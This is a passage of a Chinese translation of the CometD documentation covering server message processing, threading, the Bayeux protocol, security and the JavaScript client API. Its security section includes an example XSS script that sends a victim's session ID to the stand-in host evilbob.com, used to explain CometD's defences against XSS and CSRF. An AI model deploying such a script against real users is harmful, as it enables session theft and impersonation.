- `ServerChannel`允许你通过`ServerChannel.addAuthorizer(Authorizer)`接口添加授权者，通过`ServerChannel.addListener(ServerChannel.MessageListener)`接口添加接收消息抵达channel通知的监听器，通过`ServerChannel.addListener(ServerChannel.SubscriptionListener)`接口添加接收客户端订阅/取消订阅channel通知的监听器。
- `ServerSession`允许你通过`ServerSession.addExtension(ServerSession.Extension)`接口为流经服务端的消息添加extension。
- `ServerSession`允许你通过`ServerSession.addListener(ServerSession.RemoveListener)`接口添加接收到会话被移除通知的监听器，例如由于客户端断连，或者由于客户端遗失导致的相应的server session的服务过期。
- `ServerSession`允许你通过`ServerSession.addListener(ServerSession.QueueListener)`接口添加监听器，以监听server session的消息队列的动态，如可以探测到某消息被加入队列中；或通过`ServerSession.addListener(ServerSession.MaxQueueListener)`接口添加探测队列中消息是否超过最大数量的监听器，通过`ServerSession.addListener(ServerSession.DeQueueListener)`接口添加探测队列准备发送的监听器。
- `ServerSession`允许你通过`ServerSession.addListener(ServerSession.MessageListener)`添加接收server session接收消息（任何channel）通知的监听器。

6.3.4. Message Processing消息处理
-------------------------
本章节描述客户端与服务端之间的消息处理。通过下面的图片来理解组成客户端与服务端的详细组件。

![](https://i.imgur.com/phBcHZp.png)

当一个客户端要发送消息，它是使用客户端的channel来发布它们。客户端通过`ClientSession.getChannel(String)`接口，来从client session中获取client channel。消息首先经过各extension的逐个处理，如果某extension拒绝处理消息，那么该消息会被删除，不会发送到服务端。extension处理完毕消息后，将传递到client transport。

client transport将消息转换为JSON格式（Java客户端中，这一步是由`JSONContext.Client`实例实施的，详见JSON章节），然后与server transport建立起管道（conduit），作为transport-specific envelope（例如：HTTP请求或者WebSocket消息）通过管道发送JSON字符串。

envelope抵达服务端后，server transport接收到它们。server transport将这些JSON格式的消息转换回消息对象（通过`JSONContext.Server`实例，详见JSON章节），然后将它们传递给`BayeuxServer`实例进行处理。

`BayeuxServer`使用下面的步聚来处理每个消息：

1. 调用`BayeuxServer`的extension（通过`rcv()`或`rcvMeta()`方法）；如果某extension拒绝处理，向客户端返回一个答复，表示此消息已被删除，并不再进一步处理该消息。
2. 调用`ServerSession`的extension（通过`rcv()`或`rcvMeta()`方法,仅当此客户端存在对应的`ServerSession`时）；如果某extension拒绝处理，向客户端返回一个答复，表示此消息已被删除，并不再进一步处理该消息。
3. 调用安全策略与授权者的认证授权检查；如果认证被拒绝，向客户端返回失败的回复，并不再进一步处理该消息。
4. 调用server channel监听器；应用程序为server添加server channel listener，提供了在发送给所有订阅者（前提是一个广播消息）之前的最后一次修改消息的机会。所有订阅者都可以看到server channel listener对消息的修改，就如是发布者自己发送了已修改过的消息一样。经过server channel listener的处理，消息被冻结，不会再被修改。应用程序不必关心冻结细节及步聚，因为API会解释消息是否可以修改：API有一个表示消息是否可以修改的参数的接口。到这一步，就是非广播消息的最后处理步聚了，然后即结束它在服务端的旅程。
5. 如果消息是一个广播消息，消息继续由`BayeuxServer`的extension们（通过send()或sendMeta()方法）传递，然后对于订阅了channel的每个server session，消息通过`ServerSession`的extension传递（通过send()和sendMeta()方法）。
6. 如果消息是一个广播消息，对于订阅了channel的每个server session，消息传经`ServerSession`监听器，在这里session拥有最后丢弃消息的机会；然后调用session queue监听器(`MaxQueueListener` 和 `QueueListener`)，最后消息被添加到server session队列中被分发出去。
7. 如果消息是一个lazy message（详见lazy message章节），它将择机第一时间发送，否则消息会立即发出去。如果是server session与远程client session相对应的排队的消息，则会分配一个线程通过server transport将消息邮送至消息队列。server transport消费server session的消息队列，将消息转换为JSON，并将它们作为transport-specific envelopes（如HTTP响应或WebSocket消息）发送至管道中。否则是server session与local session相对应的排队中的消息，则队列中的消息直接邮送至local session。
8. 对于广播/非广播消息，都会创建一个应答消息，并经由`BayeuxServer`extension和`ServerSession`extension（通过`send()`或`sendMeta()`方法）传递。传递到server transport，通过`JSONContext.Server`实例（详见JSON章节）将消息转换为JSON，然后作为一个transport-specific envelope（如HTTP响应或WebSocket消息）发送至管道中。
9. envelope返回到客户端，由client transport来接收它。client transport将消息从JSON格式转换回消息对象，在Java客户端中是通过`JSONContext.Client`实例（详见JSON章节）实现的。
10. 每个消息传递到extension（通过`send()`或`sendMeta()`方法），然后channel监听器及订阅者会收到消息通知。

整个从客户端到服务端，再回到客户端的流程现在就完成了。

6.3.5. 线程
--------------------
当服务端接收到Bayeux消息后，会指派一个线程来处理消息，进而该线程会调用服务端的CometD监听器。CometD的实现不会再启动一个线程来调用服务端的监听器；通过这种方式使线程模型保持得很简洁，并且与Servlet的线程模型非常相似。

CometD的实现还依赖于周期或延时的执行定时任务。这些定时任务的执行可能会调用服务端的CometD监听器，尤其是`BayeuxServer.SessionListener#sessionRemoved`和`ServerSession.RemoveListener`。

由于Bayeux客户端是使用了有限数量的连接来与服务端进行交互。如果一个发送至服务端的消息在一个连接上需要很长的时间来处理，客户端可能会在这个连接上发送额外的消息，但直到前一个消息处理完成后才会被处理。

因此，非常重要的是如果应用程序知道一个消息可能会触发一个很耗时的任务（例如一次数据库查询），它应该在单独的一个线程中执行。

service服务（详见java server services章节）是建立服务端监听器是一种简单的方法，但与通常的服务端监听器共享相同的线程模型：如果他们需要执行耗时任务，那么需要在单独的线程中执行，例如：

	@Service
	public class MyService {
	    @Inject
	    private BayeuxServer bayeuxServer;
	    @Session
	    private LocalSession localSession;
	
	    @Listener("/service/query")
	    public void processQuery(final ServerSession remoteSession, final ServerMessage message) {
	        new Thread() {
	            public void run() {
	                Map<String, Object> data = performTimeConsumingTask(message);
	
	                // Send data to client once the time consuming task is finished
	                remoteSession.deliver(localSession, message.getChannel(), responseData);
	            }
	        }.start();
	    }
	}

6.3.6 应用程序交互 
--------------------

既然你知道应用程序如何通过监听器和CometD进行交互，以及服务端和客户端如果处理消息，你就需要知道应用程序应该如何与消息进行交互以执行其业务逻辑。


###6.3.6.1. 服务器端身份验证


与身份验证进行交互的应用程序必须注册一个SecurityPolicy的自定义实例并重写SecurityPolicy.canHandshake（...）方法。 SecurityPolicy可以通过从握手请求中检索握手应答来自定义握手应答（例如，提供有关验证失败的详细信息）：

	public class MySecurityPolicy extends DefaultSecurityPolicy {
		public boolean canHandshake(BayeuxServer server, ServerSession session, ServerMessage message) {
        boolean authenticated = authenticate(session, message);

        if (!authenticated) {
            ServerMessage.Mutable reply = message.getAssociated();
            // Here you can customize the reply
        }

        return authenticated;
    }

###6.3.6.2. 与Meta和服务消息交互

Meta消息和服务消息在服务器上结束。应用程序只能通过服务器频道监听器与这些类型的消息交互，因此必须使用这些监听器来执行其业务逻辑。

你可以用以下方法来添加服务器频道监听器：

- 在初始化时直接同过API添加（详见服务集成章节）。
- 使用继承的服务（详见继承服务章节）间接添加。 你可以通过调用AbstractService.addService（...）或通过使用@Listener注释服务（详见注释服务章节）来完成此操作。
	


>注意：
>
>需要在服务器端监听器中执行耗时任务的应用程序应该在单独的线程中执行此操作，以避免阻塞其他传入消息的处理（另请参阅线程部分）。

###6.3.6.3.与广播消息进行交互

广播消息到达服务器，并传送到所有订阅消息频道的ServerSessions。 应用程序可以通过服务器通道监听器（与使用非广播消息的方式相同，请参阅上文），也可以使用订阅消息通道的LocalSession与广播消息进行交互。 您可以在初始化时通过API直接使用后一个解决方案（祥见服务集成章节），或者使用@Subscription注释间接地通过带注释的服务（详见继承服务章节）。

>注意：
>
>需要在服务器端监听器中执行耗时任务的应用程序应该在单独的线程中执行此操作，以避免阻塞其他传入消息的处理（另请参阅线程部分）。

###6.3.6.4. 与特定的远程客户端进行通信

想要将消息传递给特定客户端的应用程序可以通过查找其对应的服务器会话并使用ServerSession.deliver（）传递消息来完成此操作。

例如，远程客户端client1想要将消息发送到另一个远程客户端client2。 两个客户端都已连接，因此已经与服务器进行了握手。 他们的握手包含了关于他们的userId的附加信息，所以client1声明为“Bob”，client2声明为“Alice”。 应用程序可以使用SecurityPolicy或BayeuxServer.SessionListener来执行userId和服务器会话ID之间的映射，就像身份验证章节所述。

现在Bob想要发送一条私密的信息给Alice。

客户端1可以使用专用消息的服务通道（如/ service / private），以便消息不被广播，并且设置应用程序以便服务器通道侦听器路由消息将到达（/ service / private）另一个远程客户。

	@Service
	public class PrivateMessageService {
    	@Session
   		private ServerSession session;

    	@Listener("/service/private")
    	public void handlePrivateMessage(ServerSession sender, ServerMessage
		message) {
           // Retrieve the userId from the message
           String userId = message.get("targetUserId");

           // Use the mapping established during handshake to
           // retrieve the ServerSession for a given userId
           ServerSession recipient = findServerSessionFromUserId(userId);
 
           // Deliver the message to the other peer
           recipient.deliver(session, message.getChannel(), message.getData());
	   }
	}

###6.3.6.5. 服务器端消息广播

应用程序可能需要在特定的频道上广播消息以响应外部事件。 由于BayeuxServer是服务器通道的存储库，因此外部事件处理程序只需要引用BayeuxServer来广播消息：


		
	public class ExternalEventBroadcaster {
		private final BayeuxServer bayeuxServer;

    	public ExternalEventBroadcaster(BayeuxServer bayeuxServer) {
        	this.bayeuxServer = bayeuxServer;

        	// Create a local session that will act as the "sender"
        	this.session = bayeuxServer.newLocalSession("external");
        	this.session.handshake();
    	}

    	public void onExternalEvent(ExternalEvent event) {
        	// Retrieve the channel to broadcast to, for example
        	// based on the "type" property of the external event
        	ServerChannel channel = this.bayeuxServer.getChannel("/events/" + 	event.getType());
        	if (channel != null) {
            	// Create the data to broadcast by converting the external event
            	Map<String, Object> data = convertExternalEvent(event);

            	// Broadcast the data
            	channel.publish(this.session, data);
        	}
    	}
	}


6.3.7. Bayeux协议
--------------------
客户端通过交换Bayeux消息与服务器进行通信。

Bayeux协议要求新客户端发送的第一条消息是握手消息（一条在/ meta / handshake信道上发送的消息）。 在服务器上，如果成功处理传入的握手消息，则BayeuxServer将创建代表发起握手的客户端的服务器端的半对象实例（ServerSession）。 当握手处理完成时，服务器向客户端发回握手应答。

客户端处理握手应答，并且如果成功，则通过交换连接消息（在/ meta / connect信道上发送的消息），开始 - 在掩护 - 与服务器的心跳机制。 此心跳机制的细节取决于所使用的客户端传输，但可以看作是客户端发送连接消息并在一段时间后（在使用HTTP传输时，心跳机制也称为长轮询）期待应答。 心跳机制允许客户端检测服务器是否消失（客户端没有收到来自服务器的连接消息答复），并允许服务器检测客户端是否消失（服务器没有收到来自服务器的连接消息请求 客户端）。

连接消息在客户端和服务器之间继续流动，直到任一方通过发送断开连接消息（/ meta / disconnect通道上发送的消息）决定断开连接。

在连接到服务器时，客户端可以通过发送订阅消息（在/ meta /订阅频道上发送消息）来订阅频道。 同样，客户端可以通过发送取消订阅消息（在/ meta / unsubscribe通道上发送消息）来取消订阅频道。 客户端可以随时发布包含特定于应用程序的数据的消息，这些消息可以在任何时候连接到任何广播频道（即使它没有订阅该频道）。


6.3.8.二进制数据
--------------------
Bayeux协议消息格式是JSON格式，因为Bayeux协议是在JavaScript没有二进制数据类型时设计的。

最近版本的JavaScript具有可用于表示原始二进制数据（如文件或图像）的类型化数组。一个典型的JavaScript类型数组的例子是Uint8Array，它表示一个无符号的8位整数数组。反过来，类型化数组基于较低级别的ArrayBuffer和DataView类型。

JavaScript Web API已被丰富使用ArrayBuffer或更高级别的类型数组，如Uint8Array。通过这种方式，应用程序现在可以通过JavaScript API（如FileReader.readAsArrayBuffer（））读取文件的内容，或者使用XMLHttpRequest以ArrayBuffer方式发送和接收数据。

Java当然总是有byte []和ByteBuffer形式的二进制类型。

由于Bayeux消息只能以文本表示形式携带数据，因此CometD库支持通过将JavaScript的ArrayBuffer或Java的byte []表示的二进制数据转换为使用Z85编码/解码的文本格式的二进制数据上传和下载，格式为消息的数据字段。

对二进制表示的编码/解码由客户端和服务器上的CometD扩展执行，请参阅二进制扩展部分。

在传输二进制数据时，消息的数据字段的格式是特定的，由Java中的org.cometd.bayeux.BinaryData类和JavaScript中的等效结构表示，即具有以下字段的对象：

- 数据字段，携带数据的二进制表示。
- 最后一个字段，表示数据字段是否是二进制数据的最后一个块。
- 一个可选的元字段，携带相关的附加元数据，例如文件名，图像名称，二进制表示的MIME类型（例如image / png）等

因此，在Z85编码之后，完整的二进制消息看起来像JSON格式：


	{
    	"id": "123456",
    	"channel": "/binary",
    	"clientId": "Un1q31d3nt1f13r",
    	"data": {
        	"data": "HelloWorld", /* Z85 encoded binary data */
        	"last": true,
       		 "meta": {
           		 "content-type": "image/png"
        	 }
    	},
    	"ext": 
        	"binary": {
        	}
    	}
	}

7.安全
========

本章节讨论了Bayeux协议的安全特性以及与Bayeux协议常见攻击的关系，还有如何配置CometD来加强应用程序。

7.1. session id 的安全性
------------------------

Bayeux协议通过clientId字段在Bayeux消息中携带的session id口令标识特定会话（以前称为“客户端”）。 clientId字段值（即session Id）由服务器在客户端发送握手请求消息时生成，并在握手响应消息（请参阅Bayeux协议握手）中发送回客户端。 然后，客户端将每个后续消息中的clientId字段发送到服务器，直到断开连接。

session ID 是使用强大的随机数生成器生成的，因此它不会被别有用心的第三方推测。 只知道自己session ID的用户不能通过查看自己的session ID来猜测其他用户的session ID。

虽然session ID的不可猜测性是一个很好的起点，但它通常是不够的，请继续阅读下一章节。

7.2. 抵御中间人攻击的安全性
-------------------------

攻击者可能有能力观察Bayeux协议流量，就像中间人一样。

在这种情况下，典型的解决方案是使用TLS加密客户端和服务器之间的流量。 通过这种方式，客户端和服务器之间的所有流量都是端对端加密的，而中间人无法查看或以其他方式检索其他人的会话ID。

7.3. 针对跨站点脚本（XSS）攻击的安全性
-----------------------------------

跨站点脚本攻击是Web应用程序的一个特别重要的漏洞。

XSS的一个典型例子如下：

攻击者Bob连接到使用CometD的聊天服务。 在那里，他找到了另一个用户Alice。 Bob向Alice发送一个攻击性的聊天消息文本，文本如下：

		<script type="text/javascript">
		var xhr = new XMLHttpRequest();
		xhr.open("GET", "http://evilbob.com?stolen=" + $.cometd.getClientId());
		xhr.send();
		</script>

如您所见，脚本访问CometD的会话ID（通过$ .cometd.getClientId（））。


>信息：
>
>删除getClientId（）方法不能解决问题，因为恶意脚本可以通过其他方式访问session ID。 例如，通过注册一个分机，或通过其他方式观看来往于应用程序正常运行的Bayeux消息，或通过快速断开和重新连接会话等等。

Bob发送的那条到达CometD服务器并被路由发送给Alice的恶意消息。 当它到达Alice的浏览器时，如果应用程序是XSS易受攻击的，那么该脚本可能由浏览器运行。

如果脚本运行，Bob将能够窃取Alice的session ID，并将其发送到Bob能访问的服务器evilbob.com。

>注意：
>
>如果您的Web应用程序存在XSS易受攻击，攻击者可以造成比窃取CometD sessionID更多的损失，因此您的Web应用程序清理从其他用户聊天消息等未知来源接收的数据至关重要。

如果Bob窃取了Alice的 session ID，他可以用Alice的session ID编写Bayeux消息并从他的计算机发送出去，从而可以冒充Alice。

CometD可以以不同的方式防止由于会话ID被盗的模仿行为，这取决于用于传输Bayeux消息的传输类型。

对于基于HTTP（长轮询和回调轮询）的传输，CometD发送一个带有握手响应的HTTP cookie，标记为HttpOnly，称作BAYEUX_BROWSER（详见配置Java服务器）。 在处理握手请求消息期间，服务器上的CometD实现将该cookie映射到合法的sessionID。 对于每个后续消息，浏览器都会将BAYEUX_BROWSER cookie发送到服务器，而CometD实现将从已映射到cookie的合法会话中检索sessionID，而不是从消息（可能已被更改）中检索。

Bob可以用Alice的ID编写一条消息，但他随篡改消息发送的BAYEUX_BROWSER cookie也是他的，而不是Alice的。 CometD将检测到这种攻击并要求Bob重新握手。

如果编写的消息没有任何Cookie，CometD会要求Bob重新握手。

对于基于WebSocket（websocket）的传输，CometD信任握手期间建立的特定连接。 session ID与该连接相关联，并且当WebSocket消息到达该连接时，CometD从与连接的关联中检索session ID，而不是从消息（可能已被更改）中检索session ID。

当连接关闭时，例如网络故障，CometD尝试打开另一个连接。 如果重新连接在短时间内发生（通常小于服务器上配置的最大周期），则CometD将尝试在新连接上发送消息而无需重新握手，但由于这是一个新的连接，它没有处理握手消息，就不会有关联的session ID。

在这一点上，CometD可以要求客户重新握手（这涉及到一些往返行程的完成，可能会在网络出现故障时进一步降低通信速度），或者它可以信任消息中的会话标识（这会 产生更快的重新连接，尽管如果session ID被盗，会降低安全性）。 这由requireHandshakePerConnection参数控制，详见配置Java服务器。


7.4.针对跨站请求伪造（CSRF）攻击的安全性
------------------------------------

跨站点请求伪造攻击是Web应用程序的一个特别重要的漏洞。

CSRF的一个典型例子如下：

Bob使用CometD连接到cometd-chat.com上的聊天服务。 在那里，他找到了另一个用户Alice。 Bob向Alice发送一个攻击性的聊天消息文本，文本如下：
	Look at this: http://evilbob.com/cometd

Alice点击链接，她的浏览器打开一个新标签页http://evilbob.com/cometd，一个包含脚本的娱乐性HTML页面被下载到Alice的浏览器。

在Alice看着Bob的娱乐页面时，她的浏览器运行脚本，该脚本可以代表爱丽丝在使用CometD的聊天服务上执行操作。

例如，Bob可以使用XSS窃取Alice的session ID，然后制作恶意邮件并将其发送到Alice的浏览器的聊天服务。 Alice的浏览器会将现有的Alice的BAYEUX_BROWSER cookie与恶意邮件一起发送给服务器，而恶意邮件将与Alice发送的合法邮件是无法区分的，因为都将携带她的BAYEUX_BROWSER cookie和她被盗的session ID。

CometD不会自动防止CSRF攻击，但通过配置本节中所述的跨源过滤器，这些攻击很容易被伪造。

Alice的合法消息由聊天服务下载的脚本发送，因此将具有以下HTTP标头：
	Origin: http://cometd-chat.com

相反，Bob的攻击脚本是从http://evilbob.com下载的，他的攻击信息将具有以下HTTP标头：
	Origin: http://evilbob.com

cometd-chat.com上的应用程序可以安装跨源筛选器并将其配置为仅允许来自cometd-chat.com源的请求，从而有效阻止Bob的CSRF攻击。 这是有效的，因为在向不同的目标源发送HTTP请求之前，浏览器需要执行预检请求。 预检请求将被跨源过滤器拦截并被拒绝。 不成功的预检响应指示浏览器脚本无法对该目标原点执行任何请求，浏览器将阻止脚本向目标域发出请求。


8. JavaScript库
===============
JavaScript CometD JavaScript库是一个可移植的JavaScript实现，具有完全基于纯JavaScript和浏览器中可用的标准对象的vanilla实现，以及用于主要JavaScript工具包（当前Dojo，jQuery和Angular 1）的绑定。这意味着CometD Bayeux JavaScript实现是用纯JavaScript编写的，不依赖于工具包，工具包绑定添加了使Bayeux API感觉就像它们本身就是工具包的糖衣语法。 例如，使用以下符号可以引用标准的cometd对象：

	// CommonJS style
	
	var cometd = require('cometd');

	// AMD style
	
	require(['cometd'], function(cometd) {
    	...
	});

	// Vanilla style

	var cometd = new org.cometd.CometD();

	// jQuery style

	var cometd = $.cometd;

    // Angular style

	angular.module('cometdApp', ['cometd'])
    .controller('cometdCtrl', ['cometd'], function(cometd) {
        ...
    });

	// Old Dojo style

	var cometd = dojox.cometd

如果你遵循引导，你可能已经注意到框架项目建议你在dojox / cometd.js下引用cometd / cometd.js下的可移植实现和一个绑定 - 例如Dojo's。 对于jQuery，绑定在jquery / jquery.cometd.js下。 JavaScript工具包中Bayeux API的使用几乎完全相同，以下各节并未涉及特定的工具包。 只有将回调函数传递给Bayeux API时才会出现小差异，其中Dojo用户可能使用hitch（），而jQuery用户可能更喜欢匿名函数方法。

以下部分提供了有关JavaScript Bayeux API及其实现秘密的详细信息。

8.1. 配置和初始化
----------------

在底层文件设置好骨架项目之后，您可能需要完全理解如何自定义和配置管理CometD实施行为的参数。

完整的API可通过名为org.cometd.CometD的单个对象原型提供。 Dojo工具包有一个名为dojox.cometd的对象实例，而对于jQuery，它可以使用名称$ .cometd。 这个默认的cometd对象已经实例化并配置了默认值，并且它尚未启动任何Bayeux通信。




一个cometd对象连接到一个Bayeux服务器。 如果您需要连接到多个Bayeux服务器，请参阅本节。

有两种方法可以传递URL参数：

	// First style: URL string
	cometd.configure('http://localhost:8080/cometd');

	// Second style: configuration object
	cometd.configure({
    	url: 'http://localhost:8080/cometd'
	});
第一种方式是第二种方式的简写。 但是，第二种方法允许您传递其他配置参数，目前：

| 变量名        | 是否必要    |默认值    |变量描述
| --------   | -----:   | :----: |:----: 
| url        | yes      |       |此客户端将连接到的Bayeux服务器的URL。
| logLevel        | no      |   info    |logLevel。 可能的值有：“warn”，“info”，“debug”。 输出到可用的window.console。
| maxConnections        | no      |   2    |用于连接到Bayeux服务器的最大连接数。 只有在确切知道客户端的连接限制以及“长轮询后排队的请求”含义的情况下才更改此值。
| backoffIncrement        | no      |   1000    |每次与Bayeux服务器的连接失败时，退避时间增加的毫秒数。 CometD在退避时间结束后尝试重新连接。
| maxBackoff        | no      |   60000    |退避时间的最大毫秒数，此后退避时间不会进一步增加。
| maxNetworkDelay        | no      |   10000    |在考虑请求Bayeux服务器之前，等待的最大毫秒数是失败的。
| requestHeaders        | no      |   {}    |包含要为每个Bayeux请求发送的请求标头的对象（例如，{“My-Custom-Header”：“MyValue”}）。
| appendMessageTypeToURL        | no      | true  |确定Bayeux消息类型（握手，连接，断开连接）是否附加到Bayeux服务器的URL（请参阅上文）。
| autoBatch        | no      |   false    |确定排队的多个发布是否首次作为批处理发送，而不需要显式批处理。
| connectTimeout        | no      |   0    |等待WebSocket连接打开的最大毫秒数。 它不适用于HTTP连接。 超时值0意味着永远等待。
| stickyReconnect        | no      |   true    |只适用于websocket运输。 确定在websocket传输能够成功连接到服务器后检测到WebSocket传输故障时是否使用WebSocket传输。
| maxURILength        | no      |   2000    |使用回调轮询传输进行请求的URI的最大长度。 已知Microsoft Internet Explorer 7和8限制了URI的长度，因此在使用JSON编码时，CometD发送的单个大消息可能无法保持在最大URI长度范围内。


配置完cometd对象后，在调用握手（）之前，Bayeux通信不会启动（另请参阅javascript握手部分）。

JavaScript CometD实现的以前用户称为init（）的函数。 该函数仍然存在，并且它是调用configure（）后面跟随handshake（）的简写。 它也适用于init（）参照握手部分章节的方式。


###8.1.1. 配置和初始化多个对象

有时需要连接到多个Bayeux服务器。 以dojox.cometd或$ .cometd形式提供的默认cometd对象只能配置为连接到一台服务器。

但是，创建其他cometd对象很容易。 在Dojo中，有一个dojox.CometD（注意CometD种'C'和'D'是大写）构造函数，可用于创建新的cometd对象。 在jQuery中，有一个等价的$ .CometD构造函数。 它可以以这种方式使用：


	// Dojo style
	var cometd1 = dojox.cometd; // The default cometd object
	var cometd2 = new dojox.CometD(); // A second cometd object

	// jQuery style
	var cometd1 = $.cometd; // The default cometd object
	var cometd2 = new $.CometD(); // A second cometd object

	// Configure and handshake
	cometd1.init('http://host1:8080/cometd');
	cometd2.init('http://host2:9090/cometd');

请注意两个cometd对象是如何使用不同的URL进行初始化的。


###8.1.2. 在多个对象中扩展配置

在扩展部分中介绍了在默认的cometd对象中配置扩展。 要为其他cometd对象配置扩展，必须按以下方式手动完成：

	// Dojo style
	var cometd1 = dojox.cometd; // The default cometd object
	var cometd2 = new dojox.CometD(); // A second cometd object

	// jQuery style
	var cometd1 = $.cometd; // The default cometd object
	var cometd2 = new $.CometD(); // A second cometd object

	// Configure extensions for the second object
	cometd2.registerExtension('ack', new org.cometd.AckExtension());
	cometd2.registerExtension('timestamp', new org.cometd.TimeStampExtension());
	cometd2.registerExtension('timesync', new org.cometd.TimeSyncExtension());
	cometd2.registerExtension('reload', new org.cometd.ReloadExtension());

您不应该以这种方式配置默认cometd对象的扩展名，而应该按照扩展章节的方式进行配置。

您应该像上面显示的那样手动扩展配置，仅用于其他cometd对象。 您可以为其他cometd对象配置零个，一个或所有扩展，具体取决于您的应用程序需求。

8.2. 握手
---------

为了启动与Bayeux服务器的通信，您必须调用cometd对象上的handshake（）或init（）函数。 init（）函数是调用configure（）（详见javascript配置章节），再调用handshake（）的方法的简写。

调用握手（）有效地向服务器发送握手消息请求，并且Bayeux协议要求服务器向客户端发送握手消息应答。

Bayeux握手与Bayeux服务器建立网络通信，协商要使用的传输类型，并协商许多协议参数以供后续通信使用。

一旦调用了handshake（）之后，除非已通过调用disconnect（）明确断开连接，否则不得再次调用handshake（）。

通过将handshake（）调用绑定到页面加载事件（仅发生一次），这通常很容易实施。

或者，如果握手（）是通过与用户界面交互（例如通过单击按钮）触发的，则可以非常容易地禁用用户界面（例如，在点击后立即禁用按钮），或者使用布尔变量来防止多次握手。

与JavaScript CometD API的几个函数一样，handshake（）是一个异步函数：它在Bayeux握手步骤完成之前立即返回。

>注意：
>
>调用handshake（）并不意味着握手（）返回时已完成与服务器的握手。

可以调用handshake（）函数作为参数传递一个回调函数，当服务器握手消息应答到达客户端时将调用该回调函数（或者，如果服务器没有回复，当客户端检测到握手失败时）：


	// Configure
	cometd.configure({
    	url: 'http://localhost:8080/cometd'
	});

	// Handshake with callback
	cometd.init(function(handshakeReply) {
    	if (handshakeReply.successful) {
        	// Successfully connected to the server.
        	// Now it is possible to subscribe or send messages
    	} else {
       		// Cannot handshake with the server, alert user.
    	}
	});

将回调函数传递给handshake（）相当于注册一个/ meta / handshake侦听器（另请参阅本节）。

握手可能失败的原因有几个：

- 输入了错误的服务器URL。
- 运输无法成功进行谈判。
- 服务器拒绝握手（例如，身份验证错误）。
- 服务器瘫痪
- 有一个网络故障。

在握手失败的情况下，应用程序不应该尝试再次调用握手（）：CometD库将代表应用程序执行此操作。 这样做的必然结果是，应用程序通常只会在代码中调用一次握手（）。

由于handshake（）调用是异步的，因此不应该如下编写代码：

	// WRONG CODE

	cometd.configure({
    	url: 'http://localhost:8080/cometd'
	});

	// Handshake
	cometd.handshake();

	// Publish to a channel
	cometd.publish('/foo', { foo: 'bar' });

这不是一个好方法，因为不能保证对publish（）的调用（详见JavaScript发布章节）实际上可以成功地联系Bayeux服务器。 由于API是异步的，因此您无法同步知道（即通过让handshake（）函数返回错误代码或通过抛出异常）握手失败。

正确的方式如下：
	cometd.configure({
    	url: 'http://localhost:8080/cometd'
	});

	// Handshake
	cometd.handshake(function(handshakeReply) {
    	if (handshakeReply.successful) {
        	// Publish to a channel
        	cometd.publish('/foo', { foo: 'bar' });
    	}
	});

如果您想要将其他信息传递给握手消息（例如，身份验证凭据），则可以将其他对象传递给handshake（）函数：

	cometd.configure({
    	url: 'http://localhost:8080/cometd'
	});

	// Handshake with additional information.
	var additional = {
    	com.acme.credentials: {
        	user: 'cometd',
        	token: 'xyzsecretabc'
    	}
	};
	cometd.handshake(additional, function(handshakeReply) {
    	if (handshakeReply.successful) {
        	// Your logic here.
    	}
	});

附加对象将被合并到握手消息中。

服务器将能够从/ meta / handshake侦听器访问消息（但不是会话），例如使用带注释的服务（详见注释的服务章节）：

	@Service
	public class MyService {
    	@Listener(Channel.META_HANDSHAKE)
    	public void metaHandshake(ServerSession remote, ServerMessage message) {
        	// Parameter "remote" will be null here.

        	Map<String, Object> credentials = (Map<String, Object>)message.get	("com.acme.credentials");
        	// Verify credentials.
    	}
	}

有关需要ServerSession可用性的握手消息的更高级处理，请参阅身份验证部分。

不得使用附加对象通过使用Bayeux协议定义的保留字段来篡改握手消息（另请参阅Bayeux协议部分）。 相反，您应该使用对您的应用程序唯一的字段名称，更好的是像com.acme.credentials这样的完全限定。

CometD JavaScript API提供了一种简单的方式来接收有关Bayeux协议消息交换细节的通知：或者通过将特殊通道（称为元通道）添加到监听器中，在javascript subscribe部分中进行了解释，或者将回调函数传递给API 你在上面的例子中为handshake（）做了。

8.3.订阅和取消订阅
----------------

以下部分提供了有关订阅和取消订阅JavaScript库的信息。

根据频道的类型，订阅和取消订阅频道具有不同的含义。有关通道类型定义，请参阅通道概念部分。

###8.3.1.元渠道

无法订阅元信道：服务器回复错误消息。可以收听元信道（请参阅本节以了解订阅者和听众之间的区别）。您不能（也没有意义）将消息发布到元通道：只有Bayeux协议实现在元通道上创建和发送消息。 Meta通道在客户端可用于侦听错误消息，如握手错误（例如，因为客户端没有提供正确凭证）或网络错误（例如，要知道何时与服务器的连接已断开或何时断开被重新建立）。

###8.3.2.服务渠道

服务频道用于客户端和服务器之间的通信请求/响应方式（与广播频道上的发布/订阅方式相反）。虽然订阅服务通道不会产生错误，但这对服务器来说是无效的：服务器忽略订阅请求。利用特定客户端（在服务信道上发布消息的客户端）与服务器之间的通信语义，可以发布到服务渠道。服务渠道对于实现私人聊天消息非常有用：在与userA，userB和userC的聊天中，userA可以使用服务渠道向userC发布私人消息（无需用户B了解）。

###8.3.3.广播频道

广播频道具有消息主题的语义，并且在发布/订阅式通信的情况下使用。通常，可以订阅广播频道并发布到广播频道;只能使用Bayeux服务器上的安全策略（另请参阅Java服务器授权部分）或使用授权人（另请参阅授权人部分）来禁止此操作。广播频道对于向所有订阅的客户端广播消息很有用，例如在股票价格变化的情况下。

###8.3.4.订阅者与听众

JavaScript CometD API有两个API可用于频道订阅：

1.addListener（）和通讯员removeListener（）

2.subscribe（）和记者取消订阅（）

- addListener（）函数：

- 必须用于收听元信道消息。

- 可用于收听服务频道消息。

- 不应该用于监听广播频道消息（使用subscribe（）代替）。

- 不涉及与Bayeux服务器的任何通信，因此可以在调用握手（）之前调用。是同步的：当它返回时，保证已经添加了监听器。

subscribe（）函数：

- 不得用于收听元信道消息（如果尝试，服务器返回错误）。

- 可用于收听服务频道消息。

- 应该用来收听广播频道消息。
 
- 涉及与Bayeux服务器的通信，因此在调用握手（）之前不能调用。

- 是异步的：在Bayeux服务器收到订阅请求之前立即返回。

>注意
>>调用subscribe（）并不意味着你在函数返回时已经完成了与服务器的订阅。

如果你想确定服务器收到你的订阅请求（或不），你可以注册一个/ meta /订阅监听器，或者将一个回调函数传递给subscribe（）：

	cometd.subscribe('/foo', function(message) { ... }, function(subscribeReply) {
	    if (subscribeReply.successful) {
	        // The server successfully subscribed this client to the "/foo" channel.
	    }
	});

请记住，服务器上的订阅可能会失败（例如，客户端没有足够的权限进行订阅）或客户端上（例如，网络故障）。 在这两种情况下，元/订阅侦听器或回调函数都将被调用，但不成功的订阅消息应答。

您可以通过将附加对象传递给subscribe（）函数来将其他信息传递给订阅消息：

	var additional = {
	    com.acme.priority: 10
	};
	cometd.subscribe('/foo', function(message) { ... }, additional, function(subscribeReply) {
	    // Your logic here.
	});

